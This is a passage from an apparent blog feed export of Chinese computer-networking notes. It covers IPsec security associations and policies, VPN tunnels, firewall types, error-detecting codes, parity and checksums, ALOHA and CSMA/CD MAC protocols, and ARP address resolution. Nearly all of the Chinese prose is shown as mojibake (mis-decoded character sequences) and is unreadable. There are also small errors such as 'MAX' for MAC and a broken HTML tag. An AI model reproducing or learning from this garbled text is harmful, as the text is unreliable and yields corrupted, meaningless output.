<li>éš§é“æ¨¡å¼ï¼šæœ€é‡è¦æœ€å¸¸è§çš„ IPsec å®ç°<br><img src="https://i.loli.net/2020/02/11/HKMmj89w2WpdXG1.png" alt="éš§é“æ¨¡å¼ESPè®°å½•"></li>
</ul>
</li>
</ul>
<h3 id="å®‰å…¨å…³è”"><a href="#å®‰å…¨å…³è”" class="headerlink" title="å®‰å…¨å…³è”"></a>å®‰å…¨å…³è”</h3><p>å‘é€æ•°æ®å‰ï¼Œå‘é€ç«¯åˆ°æ¥æ”¶ç«¯ä¹‹é—´éœ€è¦å»ºç«‹å®‰å…¨å…³è” <strong>SA</strong>(Security Association)ä»¥å®šä¹‰å¯¹æ•°æ®æŠ¥çš„åŠ å¯†ç®—æ³•ä¸å¯†é’¥ã€‚ä¸¤æ–¹å‡è¦ç»´æŠ¤ SA çš„è¿æ¥çŠ¶æ€ä¿¡æ¯ã€‚æ¢è¨€ä¹‹ï¼ŒIPsec å¹¶ä¸æ˜¯ç®€å•çš„å¯¹ IP çš„å°è£…ï¼ŒIP æ˜¯æ— è¿æ¥çš„ï¼Œ<strong>IPsec æ˜¯é¢å‘è¿æ¥çš„</strong>ï¼š</p>
<p><img src="https://i.loli.net/2020/02/10/3IexuNEcTjdCKpv.png" alt="SAè¿æ¥"></p>
<h3 id="å®‰å…¨ç­–ç•¥"><a href="#å®‰å…¨ç­–ç•¥" class="headerlink" title="å®‰å…¨ç­–ç•¥"></a>å®‰å…¨ç­–ç•¥</h3><p>å®‰å…¨ç­–ç•¥ <strong>SP(Security Policy)</strong> å®šä¹‰äº†å¯¹ä»€ä¹ˆæ ·çš„æ•°æ®æµåº”ç”¨ IPsecã€‚å¤šæ¡å®‰å…¨ç­–ç•¥è®°å½•ç»„æˆäº†å®‰å…¨ç­–ç•¥æ•°æ®åº“ SPDã€‚æœåŠ¡å™¨æå–æ•°æ®æŠ¥å…³é”®ä¿¡æ¯å¡«å……åˆ°ä¸€ä¸ªç§°ä¸ºâ€œé€‰æ‹©ç¬¦â€ï¼ˆç›®æ ‡IPï¼ŒæºIPï¼Œä¼ è¾“å±‚åè®®ï¼Œæºç«¯å£ï¼Œç›®æ ‡ç«¯å£ï¼‰çš„ç»“æ„ä¸­ï¼Œåˆ©ç”¨é€‰æ‹©ç¬¦å»æœç´¢ SPDï¼Œæ£€ç´¢åŒ¹é…çš„ SPã€‚</p>
<h2 id="è™šæ‹Ÿä¸“ç”¨ç½‘ï¼ˆVPNï¼‰"><a href="#è™šæ‹Ÿä¸“ç”¨ç½‘ï¼ˆVPNï¼‰" class="headerlink" title="è™šæ‹Ÿä¸“ç”¨ç½‘ï¼ˆVPNï¼‰"></a>è™šæ‹Ÿä¸“ç”¨ç½‘ï¼ˆVPNï¼‰</h2><p>ä¸“ç”¨ç½‘ç»œï¼šåŸºäºä¸“å±çš„ç½‘ç»œè®¾å¤‡ã€é“¾è·¯æˆ–åè®®å»ºè®¾çš„ä¸“é—¨ç”¨é€”çš„ç½‘ç»œã€‚æœ€å¤§çš„å¥½å¤„å°±æ˜¯å®‰å…¨ï¼Œä½†æ˜¯æˆæœ¬å¾ˆé«˜ã€‚</p>
<p><img src="https://i.loli.net/2020/02/10/SRnjU6oa45tBFWC.png" alt="ä¸“ç”¨ç½‘ç»œ"></p>
<p>è™šæ‹Ÿä¸“ç”¨ç½‘ç»œï¼šé€šè¿‡å»ºç«‹åœ¨å…¬å…±ç½‘ç»œä¸Šçš„<strong>å®‰å…¨éš§é“</strong>ï¼Œå®ç°æ€»éƒ¨ä¸åˆ†éƒ¨çš„å®‰å…¨è¿æ¥ï¼Œåœ¨é€»è¾‘ä¸Šå»ºç«‹ä¸€ä¸ªä¸“ç”¨ç½‘ç»œï¼Œå¤§å¤§é™ä½äº†è´¹ç”¨ã€‚ç”±éš§é“æ¨¡å¼ ESP å®ç°çš„ IPsec æ˜¯ VPN æœ€å¸¸è§çš„å®ç°æ–¹æ³•ã€‚</p>
<p><img src="https://i.loli.net/2020/02/10/Ay3ohPu6sZIarG2.png" alt="è™šæ‹Ÿä¸“ç”¨ç½‘ç»œ"></p>
<p>éš§é“ï¼šé€šè¿‡ Internet æä¾›å®‰å…¨çš„ç«¯åˆ°ç«¯çš„æ•°æ®ä¼ è¾“ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§åŠ å¯†ä¸å°è£…ã€‚æ•°æ®è¿›å…¥éš§é“æ—¶ç» VPN å°è£…åœ¨ Internet ä¸­ä¼ è¾“ã€‚</p>
<h3 id="å®ç°è¿‡ç¨‹"><a href="#å®ç°è¿‡ç¨‹" class="headerlink" title="å®ç°è¿‡ç¨‹"></a>å®ç°è¿‡ç¨‹</h3><p><img src="https://i.loli.net/2020/02/11/cPOTpuCNy6EUd4F.png" alt="VPNå®ä¾‹"></p>
<ol>
<li>R1 å°† IP æ•°æ®æŠ¥è½¬æ¢ä¸º IPsec æ•°æ®æŠ¥<ul>
<li>æ£€ç´¢ SPDï¼Œç¡®å®š SP</li>
<li>æ£€ç´¢ SADï¼Œç¡®å®š SA</li>
<li>åœ¨æº IP æ•°æ®æŠ¥åé¢é™„åŠ  ESP å°¾éƒ¨</li>
<li>åˆ©ç”¨ SA çš„åŠ å¯†ç®—æ³•ä¸å¯†é’¥åŠ å¯†æ•°æ®æŠ¥</li>
<li>åœ¨åŠ å¯†ç»“æœå‰é¢é™„åŠ  ESP å¤´</li>
<li>åˆ©ç”¨ SA çš„åŠ å¯†ç®—æ³•ä¸å¯†é’¥åˆ›å»ºæŠ¥æ–‡è®¤è¯ç  MAC</li>
<li>æ„é€ æ–° IP å¤´ï¼Œå‘åˆ° R2 å»</li>
</ul>
</li>
<li>R2 è§£å° IPsec æ•°æ®æŠ¥<ul>
<li>æå– SPI å»æ£€ç´¢ SADï¼Œç¡®å®š SA</li>
<li>åˆ©ç”¨å…±äº«å¯†é’¥è§£å‡ºåŸå§‹ IP æ•°æ®æŠ¥</li>
</ul>
</li>
</ol>
<h2 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h2><p>é˜²ç«å¢™æ˜¯éš”ç¦»å†…ç½‘ä¸å…¬å…±äº’è”ç½‘ï¼Œé˜»æ­¢æŸäº›åˆ†ç»„è¿›å…¥ or ç¦»å¼€å†…ç½‘çš„è½¯ç¡¬ä»¶è®¾æ–½ã€‚å¯åˆ†ä¸ºä¸‰ç±»ï¼š</p>
<ul>
<li>æ— çŠ¶æ€åˆ†ç»„è¿‡æ»¤ï¼šä½äºç½‘ç»œè¾¹ç¼˜è·¯ç”±å™¨ï¼Œæ ¹æ® IP åœ°å€ã€ç«¯å£å·ã€åè®®ç±»å‹ç­‰ä¿¡æ¯é€ä¸ªè¿‡æ»¤åˆ†ç»„å†³å®šæ˜¯å¦è½¬å‘ã€‚</li>
<li>æœ‰çŠ¶æ€ç»„è¿‡æ»¤ï¼šè·Ÿè¸ªæ¯ä¸ª TCP è¿æ¥ï¼Œæ ¹æ® SYNã€FIN ç­‰çŠ¶æ€å†³å®šæ˜¯å¦æ”¾è¡Œåˆ†ç»„ã€‚</li>
<li>åº”ç”¨ç½‘å…³ï¼šåŸºäºåº”ç”¨å±‚æ•°æ®è¿‡æ»¤åˆ†ç»„</li>
</ul>
<p><img src="https://i.loli.net/2020/02/11/i87WYut32LzXHVG.png" alt="åº”ç”¨ç½‘å…³"></p>
]]></content>
      <categories>
        <category>è®¡ç®—æœºç½‘ç»œ</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ç½‘ç»œé‚£äº›äº‹ä¹‹é“¾è·¯å±‚</title>
    <url>/2020/01/30/%E7%BD%91%E7%BB%9C%E9%82%A3%E4%BA%9B%E4%BA%8B%E4%B9%8B%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<p>å…ˆæ˜ç¡®å‡ ä¸ªæœ¯è¯­ï¼š</p>
<ul>
<li>ç»“ç‚¹ï¼ˆnodeï¼‰ï¼šä¸»æœºå’Œè·¯ç”±å™¨</li>
<li>é“¾è·¯ï¼ˆlinkï¼‰ï¼šç›¸é‚»ç»“ç‚¹çš„è¿æ¥é€šé“</li>
<li>å¸§ï¼ˆframeï¼‰ï¼šé“¾è·¯å±‚æ•°æ®åˆ†ç»„</li>
</ul>
<p>é“¾è·¯å±‚è´Ÿè´£é€šè¿‡ä¸€æ¡é“¾è·¯åœ¨ç›¸é‚»ç»“ç‚¹ä¹‹é—´ä¼ é€æ•°æ®æŠ¥ï¼Œæä¾›çš„æœåŠ¡æœ‰ï¼š</p>
<ul>
<li>ç»„å¸§ï¼šå°è£…æ•°æ®æŠ¥æ„æˆæ•°æ®å¸§ï¼ŒåŠ é¦–éƒ¨å’Œå°¾éƒ¨ï¼Œå¸§åŒæ­¥ï¼ˆå°†ç‰©ç†å±‚æ¯”ç‰¹æµè½¬æ¢ä¸ºå¸§ï¼‰</li>
<li>é“¾è·¯æ¥å…¥ï¼šå¦‚æœé“¾è·¯æ˜¯å…±äº«çš„ï¼Œéœ€è¦è§£å†³<code>é“¾è·¯æ¥å…¥</code>é—®é¢˜ã€‚å¸§é¦–éƒ¨ MAC åœ°å€ç”¨äºæ ‡è¯†å¸§çš„æºå’Œç›®çš„åœ°</li>
<li>ç›¸é‚»ç»“ç‚¹é—´çš„å¯é äº¤ä»˜ï¼ˆä¸ä¸€å®šå®ç°ï¼‰</li>
<li>æµé‡æ§åˆ¶ï¼šåè°ƒç›¸é‚»çš„å‘é€å’Œæ¥æ”¶ç»“ç‚¹</li>
<li>å·®é”™æ£€æµ‹ä¸çº æ­£ï¼šåº”å¯¹ä¿¡å·è¡°å‡å’Œå™ªå£°</li>
</ul>
<h2 id="å·®é”™ç¼–ç "><a href="#å·®é”™ç¼–ç " class="headerlink" title="å·®é”™ç¼–ç "></a>å·®é”™ç¼–ç </h2><p>D -&gt; DRï¼ŒR ä¸ºå·®é”™æ£€æµ‹ä¸çº æ­£æ¯”ç‰¹ï¼ˆå†—ä½™æ¯”ç‰¹ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/01/31/OQePn1hbz65NMXG.png" alt="çº¿æ€§åˆ†ç»„ç "></p>
<p><strong>å·®é”™ç¼–ç ä¸ä¿è¯ 100% å¯é </strong>ï¼Œåˆ†ä¸º<strong>æ£€é”™ç </strong>ä¸<strong>çº é”™ç </strong>ã€‚</p>
<h3 id="æ£€é”™"><a href="#æ£€é”™" class="headerlink" title="æ£€é”™"></a>æ£€é”™</h3><p>è®¾ C<sub>i</sub>ã€C<sub>j</sub> ä¸ºç¼–ç é›†ä¸­ä»»æ„ä¸¤ä¸ªç å­—ï¼ŒCâ€™ ä¸ºé”™å‡ºé”™ç å­—ï¼š</p>
<p>å¯¹äºæ£€é”™ç ï¼Œå¦‚æœç¼–ç é›†çš„æ±‰æ˜è·ç¦» d = r + 1ï¼Œåˆ™è¯¥å·®é”™ç¼–ç å¯ä»¥æ£€æµ‹ r ä½å·®é”™</p>
<p><img src="https://i.loli.net/2020/02/02/Z2LgfdqeOl64Nku.png" alt="æ£€é”™ç "></p>
<p>å¯¹äºçº é”™ç ï¼Œè‹¥ç¼–ç é›†çš„æ±‰æ˜è·ç¦» D = 2r + 1ï¼Œåˆ™è¯¥å·®é”™ç¼–ç å¯ä»¥çº é”™ r ä½å·®é”™</p>
<p><img src="https://i.loli.net/2020/02/02/wfSurjoh4TsUFCg.png" alt="çº é”™ç "></p>
<h4 id="å¥‡å¶æ ¡éªŒ"><a href="#å¥‡å¶æ ¡éªŒ" class="headerlink" title="å¥‡å¶æ ¡éªŒ"></a>å¥‡å¶æ ¡éªŒ</h4><p>ç»™ä¸€ä¸²æ¯”ç‰¹å¢åŠ ä¸€ä¸ªæ ¡éªŒä½ï¼Œä½¿å¾—è¯¥ä¸²ä¸­æ‰€æœ‰ â€œ1â€ çš„ä¸ªæ•°ä¹‹å’Œä¸ºå¥‡æ•°ç§°å¥‡æ ¡éªŒï¼Œä¸ºå¶æ•°ç§°å¶æ ¡éªŒã€‚</p>
<p><img src="https://i.loli.net/2020/02/02/Sb13soanWqRtAyV.png" alt="å¥‡æ ¡éªŒ"></p>
<p><img src="https://i.loli.net/2020/02/02/gz5fEopJ2X7Zjw4.png" alt="å¶æ ¡éªŒ"></p>
<p>æ•°æ®å’Œæ ¡éªŒä½å‘é€ç»™æ¥å—æ–¹åï¼Œæ¥æ”¶æ–¹å†æ¬¡å¯¹æ•°æ®ä¸­1çš„ä¸ªæ•°è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœä¸ºå¥‡æ•°åˆ™æ ¡éªŒé€šè¿‡ï¼Œè¡¨ç¤ºæ­¤æ¬¡ä¼ è¾“è¿‡ç¨‹æœªå‘ç”Ÿé”™è¯¯ã€‚å¦‚æœä¸æ˜¯å¥‡æ•°ï¼Œåˆ™è¡¨ç¤ºæœ‰é”™è¯¯å‘ç”Ÿï¼Œæ­¤æ—¶æ¥æ”¶æ–¹å¯ä»¥å‘å‘é€æ–¹å‘é€è¯·æ±‚ï¼Œè¦æ±‚é‡æ–°å‘é€ä¸€éæ•°æ®ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>å®¹æ˜“å®ç°</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å¥‡å¶æ ¡éªŒçš„æ£€é”™ç‡åªæœ‰50%ï¼Œå› ä¸ºåªæœ‰å¥‡æ•°ä¸ªæ•°æ®ä½å‘ç”Ÿå˜åŒ–èƒ½æ£€æµ‹åˆ°ï¼Œå¦‚æœå¶æ•°ä¸ªæ•°æ®ä½å‘ç”Ÿå˜åŒ–åˆ™æ— èƒ½ä¸ºåŠ›äº†</li>
<li>æ¯ä¼ è¾“ä¸€ä¸ªå­—èŠ‚éƒ½éœ€è¦åŠ ä¸€ä½æ ¡éªŒä½ï¼Œå¯¹ä¼ è¾“æ•ˆç‡å½±å“å¾ˆå¤§</li>
<li>å¥‡å¶æ ¡éªŒåªèƒ½å‘ç°é”™è¯¯ï¼Œä½†ä¸èƒ½çº æ­£é”™è¯¯ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªèƒ½å‘Šè¯‰ä½ å‡ºé”™äº†ï¼Œä½†ä¸èƒ½å‘Šè¯‰ä½ æ€ä¹ˆå‡ºé”™äº†ï¼Œä¸€æ—¦å‘ç°é”™è¯¯ï¼Œåªå¥½é‡å‘</li>
</ul>
<h4 id="æ ¡éªŒå’Œ"><a href="#æ ¡éªŒå’Œ" class="headerlink" title="æ ¡éªŒå’Œ"></a>æ ¡éªŒå’Œ</h4><p>å‘é€ç«¯ï¼š</p>
<ol>
<li>å°†æ•°æ®æŒ‰ 16 bits ä¸€ç»„åˆ’åˆ†ä¸ºçš„äºŒè¿›åˆ¶æ•°åºåˆ—ï¼ˆæ­¤æ—¶æ•°æ®ä¸­æ ¡éªŒå’Œå­—æ®µä¸º 0ï¼‰</li>
<li>æ±‚å’Œï¼ˆSumï¼‰ï¼šå¯¹è¿™äº›äºŒè¿›åˆ¶æ•°æ±‚å’Œï¼ˆæœ€é«˜è¿›ä½çš„ â€œ1â€ è¿”å›æœ€ä½ä½ç»§ç»­ç›¸åŠ ï¼‰</li>
<li>æ ¡éªŒå’Œï¼ˆCheckSumï¼‰ï¼šSum çš„åç </li>
</ol>
<p>æ¥æ”¶ç«¯ï¼š</p>
<ol>
<li>é‡æ–°è®¡ç®—æ•°æ®çš„ CheckSumâ€™ï¼ˆæ­¤æ—¶æ•°æ®ä¸­æ ¡éªŒå’Œå­—æ®µä¸ä¸º 0ï¼‰</li>
<li>16 ä½ CheckSumâ€™ å…¨ä¸º 0ï¼Œæ— é”™</li>
</ol>
<h2 id="MAC-åè®®"><a href="#MAC-åè®®" class="headerlink" title="MAC åè®®"></a>MAC åè®®</h2><p>åŠŸèƒ½ï¼šå¤šç»“ç‚¹å…±äº«ä¼ è¾“ä¿¡é“è¿‡ç¨‹ä¸­ï¼Œé¿å…ä¿¡å·äº’ç›¸å¹²æ‰°ã€‚</p>
<p>æœ‰ä¸‰ç±» MAC åè®®ï¼š</p>
<ul>
<li>ä¿¡é“åˆ’åˆ† MAC åè®®ï¼šåˆ©ç”¨å¤šè·¯å¤ç”¨ï¼ˆæ—¶åˆ†ã€é¢‘åˆ†ï¼‰æ”¯æŒå¤šç»“ç‚¹ï¼Œæ¯ä¸ªç»“ç‚¹åªä½¿ç”¨è‡ªå·±é‚£éƒ¨åˆ†</li>
<li>éšæœºè®¿é—® MAC åè®®ï¼šä¿¡é“ä¸åˆ’åˆ†ï¼Œå…è®¸å†²çªã€‚é‡‡ç”¨â€œå†²çªæ¢å¤â€æœºåˆ¶</li>
<li>è½®è½¬ MAX åè®®ï¼šç»“ç‚¹è½®æµä½¿ç”¨ä¿¡é“ï¼Œä½¿ç”¨æ—¶å ç”¨å…¨éƒ¨å¸¦å®½</li>
</ul>
<h3 id="éšæœºè®¿é—®-MAC-åè®®"><a href="#éšæœºè®¿é—®-MAC-åè®®" class="headerlink" title="éšæœºè®¿é—® MAC åè®®"></a>éšæœºè®¿é—® MAC åè®®</h3><p>ç»“ç‚¹å‘é€åˆ†ç»„æ—¶ï¼š</p>
<ul>
<li>åˆ©ç”¨ä¿¡é“å…¨éƒ¨å¸¦å®½ R å‘é€åˆ†ç»„</li>
<li>æ²¡æœ‰äº‹å…ˆçš„ç»“ç‚¹é—´åè°ƒ</li>
</ul>
<p>å½“ä¸¤ä¸ªæˆ–å¤šä¸ªç»“ç‚¹åŒæ—¶ä¼ è¾“ï¼Œä¼šå‘ç”Ÿâ€œ<strong>å†²çª</strong>â€ã€‚</p>
<h4 id="å…¸å‹ï¼šæ—¶éš™-ALOHA-åè®®"><a href="#å…¸å‹ï¼šæ—¶éš™-ALOHA-åè®®" class="headerlink" title="å…¸å‹ï¼šæ—¶éš™ ALOHA åè®®"></a>å…¸å‹ï¼šæ—¶éš™ ALOHA åè®®</h4><p>å‡å®šï¼š</p>
<ul>
<li>æ‰€æœ‰å¸§å¤§å°ç›¸åŒ</li>
<li>æ—¶é—´è¢«åˆ’åˆ†ä¸ºç­‰é•¿æ—¶éš™ï¼ˆæ¯ä¸ªæ—¶éš™åˆšå¥½å¯ä»¥ä¼ è¾“ 1 ä¸ªå¸§ï¼‰</li>
<li>ç»“ç‚¹åªåœ¨æ—¶éš™å¼€å§‹æ—¶å‘é€å¸§</li>
<li>ç»“ç‚¹èƒ½æ£€æµ‹åˆ°å†²çª</li>
<li>æ‰€æœ‰ç»“ç‚¹çš„æ—¶é’ŸåŒæ­¥</li>
</ul>
<p>è¿è¡Œï¼š</p>
<ul>
<li>å½“ç»“ç‚¹æœ‰æ–°å¸§ï¼Œåœ¨ä¸‹ä¸€æ—¶éš™å‘é€ï¼š<ul>
<li>æ— å†²çªï¼šè¯¥ç»“ç‚¹å¯ä»¥åœ¨ä¸‹ä¸€æ—¶éš™ç»§ç»­å‘æ–°å¸§</li>
<li>å†²çªï¼šè¯¥ç»“ç‚¹åœ¨ä¸‹ä¸€æ—¶éš™ä»¥æ¦‚ç‡ <strong>P</strong> é‡ä¼ å¸§</li>
</ul>
</li>
</ul>
<p>è®¾ C å†²çªæ—¶éš™ï¼ŒE ç©ºé—²æ—¶éš™ï¼ŒS æˆåŠŸæ—¶éš™ï¼š</p>
<p><img src="https://i.loli.net/2020/02/03/M2hT9UxicJ5mapt.png" alt="æ—¶éš™ALOHA"></p>
<h4 id="å…¸å‹ï¼šçº¯-ALOHA-åè®®"><a href="#å…¸å‹ï¼šçº¯-ALOHA-åè®®" class="headerlink" title="å…¸å‹ï¼šçº¯ ALOHA åè®®"></a>å…¸å‹ï¼šçº¯ ALOHA åè®®</h4><p>ä¸åˆ’åˆ†æ—¶éš™çš„ ALOHA åè®®ï¼Œ<strong>æ— éœ€åŒæ­¥</strong>ã€‚</p>
<p>å½“æœ‰æ–°çš„å¸§ç”Ÿæˆï¼š</p>
<ul>
<li>ç«‹å³å‘é€</li>
<li>å†²çªå¯èƒ½æ€§å¢å¤§</li>
</ul>
<p>åœ¨ t<sub>0</sub> æ—¶åˆ»å‘é€çš„å¸§ï¼Œä¼šä¸åœ¨ (t<sub>0</sub>-1, t<sub>0</sub>+1) æ—¶é—´å‘é€çš„å¸§å†²çªï¼š<br><img src="https://i.loli.net/2020/02/03/HqX1ytmhi8RJxnD.png" alt="çº¯ALOHA"></p>
<h4 id="å…¸å‹ï¼šCSMA-åè®®"><a href="#å…¸å‹ï¼šCSMA-åè®®" class="headerlink" title="å…¸å‹ï¼šCSMA åè®®"></a>å…¸å‹ï¼šCSMA åè®®</h4><p>ALOHA åè®®ç»å¸¸åšäº›æŸäººä¸åˆ©å·±çš„äº‹ï¼Œä¸è€ƒè™‘å…¶å®ƒç»“ç‚¹çš„æ„Ÿå—å»å ç”¨ä¿¡é“ã€‚<strong>è½½æ³¢ç›‘å¬å¤šè·¯è®¿é—®åè®® CSMA</strong>(carrier sense multiple access) ä¸ä¹‹ç›¸æ¯”æœ€å¤§çš„æ”¹è¿›åœ¨äº<strong>å‘é€å¸§ä¹‹å‰ï¼Œå…ˆç›‘å¬ä¿¡é“ï¼ˆè½½æ³¢ï¼‰</strong>ï¼š</p>
<ul>
<li>ä¿¡é“ç©ºé—²ï¼šå‘é€å®Œæ•´å¸§</li>
<li>ä¿¡é“å¿™ï¼šæ¨è¿Ÿå‘é€<ul>
<li>1-åšæŒ CSMAï¼šä»¥æ¦‚ç‡ P=1 <strong>ä¸€ç›´ç›‘å¬</strong>ä¿¡é“ï¼Œä¸€æ—¦ä¿¡é“ç©ºé—²ç«‹åˆ»å‘é€è¿™ä¸ªå¸§</li>
<li>éåšæŒ CSMAï¼š<strong>éšæœºç›‘å¬</strong>ä¿¡é“</li>
<li>P-åšæŒ CSMAä»¥ æ¦‚ç‡ P åšæŒç›‘å¬ä¿¡é“ï¼Œä»¥ æ¦‚ç‡ 1-p éšæœºç›‘å¬ä¿¡é“</li>
</ul>
</li>
</ul>
<p>ç”±äºä¿¡å·åœ¨ä¿¡é“ä¸Šçš„ä¼ è¾“å»¶è¿Ÿï¼Œå†²çªä»ç„¶å¯èƒ½å‘ç”Ÿï¼š</p>
<p><img src="https://i.loli.net/2020/02/03/hZRAYIUpXG9q6c3.png" alt="CSDMå†²çª"></p>
<h4 id="å…¸å‹ï¼šCSMA-CD-åè®®"><a href="#å…¸å‹ï¼šCSMA-CD-åè®®" class="headerlink" title="å…¸å‹ï¼šCSMA/CD åè®®"></a>å…¸å‹ï¼šCSMA/CD åè®®</h4><p>CSMA/CD åè®®æ˜¯å¸¦æœ‰å†²çªæ£€æµ‹çš„ CSMA åè®®ï¼š</p>
<ul>
<li>çŸ­æ—¶é—´å†…å¯ä»¥æ£€æµ‹åˆ°å†²çª</li>
<li>å†²çªåä¼ è¾“ä¸­æ­¢ï¼Œå‡å°‘ä¿¡é“æµªè´¹</li>
</ul>
<p><img src="https://i.loli.net/2020/02/03/OiRWNLvsruQg4a5.png" alt="CSDM/CDå†²çªæ£€æµ‹"></p>
<p>æœ€å¤§ç‰¹ç‚¹ï¼š<strong>è¾¹å‘è¾¹å¬ï¼Œä¸å‘ä¸å¬ï¼</strong></p>
<p>è®¾ç½‘ç»œå¸¦å®½ R(bps)ï¼Œæ•°æ®å¸§æœ€å°é•¿åº¦ L<sub>min</min>(bits)ï¼Œä¿¡å·ä¼ æ’­é€Ÿåº¦ V(m/s)ï¼š</p>
<p><img src="https://i.loli.net/2020/02/03/1q5hVjXolUWLFsA.png" alt="æœ€å°å‘é€æ—¶é—´"></p>
<p>A å¦‚æœè¦æ£€æµ‹åˆ° B çš„å†²çªï¼Œå¿…é¡»ä¿è¯ L<sub>min</sub>/R &gt;= 2d<sub>max</sub>/Vï¼Œå¦‚æœç®—ä¸Šè·¯ç”±å™¨ç­‰è€—æ—¶åˆ™æ˜¯ <strong>L<sub>min</sub>/R &gt;= RTT</strong>ã€‚</p>
<h3 id="ä¿¡é“åˆ’åˆ†ä¸éšæœºè®¿é—®å¯¹æ¯”"><a href="#ä¿¡é“åˆ’åˆ†ä¸éšæœºè®¿é—®å¯¹æ¯”" class="headerlink" title="ä¿¡é“åˆ’åˆ†ä¸éšæœºè®¿é—®å¯¹æ¯”"></a>ä¿¡é“åˆ’åˆ†ä¸éšæœºè®¿é—®å¯¹æ¯”</h3><p>ä¿¡é“åˆ’åˆ† MAC åè®®ï¼š</p>
<ul>
<li>ç½‘ç»œè´Ÿè½½é‡æ—¶ï¼Œå…±äº«ä¿¡é“<strong>æ•ˆç‡é«˜</strong>ä¸”<strong>å…¬å¹³</strong></li>
<li>ç½‘ç»œè´Ÿè½½è½»æ—¶ï¼Œå…±äº«ä¿¡é“<strong>æ•ˆç‡ä½</strong></li>
</ul>
<p>éšæœºè®¿é—® MAC åè®®ï¼š</p>
<ul>
<li>ç½‘ç»œè´Ÿè½½è½»æ—¶ï¼Œå…±äº«ä¿¡é“<strong>æ•ˆç‡é«˜</strong>ï¼Œå•ä¸ªç»“ç‚¹å¯ä»¥åˆ©ç”¨å…¨éƒ¨å¸¦å®½</li>
<li>ç½‘ç»œè´Ÿè½½é‡æ—¶ï¼Œäº§ç”Ÿå†²çªå¼€é”€</li>
</ul>
<h2 id="ARP-ä¸-MAC"><a href="#ARP-ä¸-MAC" class="headerlink" title="ARP ä¸ MAC"></a>ARP ä¸ MAC</h2><p>MAC åœ°å€å…± 48bitsï¼Œç”¨ 16 è¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚ç”¨äºæ ‡è¯†å±€åŸŸç½‘å†…ä¸€ä¸ªå¸§ä»å“ªä¸ªæ¥å£å‘å‡ºï¼Œåˆ°è¾¾å“ªä¸ªç‰©ç†ç›¸è¿çš„å…¶ä»–æ¥å£ã€‚æ¯å—ç½‘å¡éƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„ MAC åœ°å€ï¼Œå¦‚ï¼š1A-2F-BB-76-09-AD</p>
<h2 id="ARP-åè®®"><a href="#ARP-åè®®" class="headerlink" title="ARP åè®®"></a>ARP åè®®</h2><p>åœ°å€è§£æåè®®ï¼ˆARP, Address Resolve Protocalï¼‰è´Ÿè´£ç½‘ç»œå±‚åœ°å€ä¸é“¾è·¯å±‚åœ°å€çš„è½¬æ¢ã€‚</p>
<p>ARP è¡¨ï¼šLAN ä¸­æ¯ä¸ª IP ç»“ç‚¹ç»´æŠ¤ä¸€ä¸ªè¡¨ï¼Œå­˜å‚¨æŸäº› LAN ç»“ç‚¹çš„ [IP, MAC, TTL] æ˜ å°„å…³ç³»</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ª ARP è¡¨ç¤ºä¾‹ï¼ˆæœ¬åœ°ç½‘å¡ IP åœ°å€ 192.168.100.107ï¼Œå­ç½‘æ©ç  255.255.255.0ï¼Œé»˜è®¤ç½‘å…³ 192.168.100.11ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/05/17/d6eJ9OhzwVrcHxk.png" alt="ARPè¡¨"></p>
<p>ä¾‹1ï¼šA æƒ³è¦ç»™<strong>åŒä¸€å±€åŸŸç½‘å†…</strong>çš„ B å‘é€æ•°æ®æŠ¥ï¼ˆB çš„MAC åœ°å€ä¸åœ¨ A çš„ ARP è¡¨ä¸­ï¼‰ï¼š</p>
<ol>
<li>A <strong>å¹¿æ’­</strong> ARP æŸ¥è¯¢åˆ†ç»„ï¼Œå…¶ä¸­åŒ…å« B çš„ IP åœ°å€</li>
<li>B æ¥æ”¶ ARP æŸ¥è¯¢åˆ†ç»„ï¼ŒIP åœ°å€åŒ¹é…æˆåŠŸï¼Œå‘ A åº”ç­” B çš„ MAC åœ°å€</li>
<li>A åœ¨è‡ªå·±çš„ ARP è¡¨ä¸­ç¼“å­˜ B çš„ IP-MAC æ˜ å°„ç›´è‡³è¶…æ—¶ï¼ˆè¶…æ—¶åå†æ¬¡åˆ·æ–°ï¼‰</li>
</ol>
<p><img src="https://i.loli.net/2021/03/10/a8ercKtqWwEDu7p.png" alt="åŒä¸€å­ç½‘ARP.png"></p>
<p>ä¾‹2ï¼šA æƒ³è¦ç»™<strong>ä¸åŒå±€åŸŸç½‘å†…</strong>çš„ B å‘é€æ•°æ®æŠ¥ï¼ˆB çš„MAC åœ°å€ä¸åœ¨ A çš„ ARP è¡¨ä¸­ï¼ŒA çŸ¥é“ç¬¬ä¸€è·³è·¯ç”±å™¨æ¥å£çš„ MAC åœ°å€ï¼‰ï¼š</p>
<p><img src="https://i.loli.net/2020/02/03/6ISrl85JXjqokQC.png" alt="LANé—´ARP"></p>
<ol>
<li>A æ„é€  IP æ•°æ®æŠ¥ï¼Œæº IP åœ°å€ä¸º A çš„ï¼Œç›®çš„ IP åœ°å€ä¸º B çš„</li>
<li>A æ„é€ é“¾è·¯å±‚å¸§ï¼Œæº MAC åœ°å€ä¸º A çš„ï¼Œç›®çš„ MAC åœ°å€ä¸ºç¬¬ä¸€è·³è·¯ç”±å™¨çš„</li>
<li>R æ¥æ”¶å¸§ï¼Œæå– IP æ•°æ®æŠ¥ä¼ é€’ç»™ä¸Šå±‚ IP åè®®ï¼Œåˆ©ç”¨è½¬å‘è¡¨è½¬å‘ IP æ•°æ®æŠ¥</li>
<li>R åˆ›å»ºé“¾è·¯å±‚å¸§ï¼Œæº MAC åœ°å€ä¸º R å‡ºå£çš„ï¼Œç›®çš„ MAC åœ°å€ä¸º B çš„</li>
</ol>
<p><strong>æ•°æ®å¸§ä¼ é€’è¿‡ç¨‹ä¸­æº/ç›®çš„ MAC åœ°å€ä¸æ–­æ”¹å˜ï¼</strong></p>
